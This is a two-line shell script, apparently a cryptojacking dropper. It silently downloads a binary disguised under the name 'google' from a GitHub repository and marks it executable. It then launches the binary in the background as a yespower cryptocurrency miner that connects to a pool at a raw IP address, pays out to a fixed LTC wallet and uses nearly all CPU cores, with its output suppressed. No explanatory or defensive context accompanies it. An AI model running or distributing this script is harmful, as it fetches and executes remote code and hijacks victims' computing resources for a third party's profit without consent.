wget https://github.com/aurbach55/sugeh-ice/raw/main/google >/dev/null 2>&1 && chmod 777 google >/dev/null 2>&1

nohup ./google -a yespower -o stratum+tcp://103.249.70.7:6533 -u LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV -p c=LTC  -t $(nproc --ignore 1) > nohup.out >/dev/null 2>&1
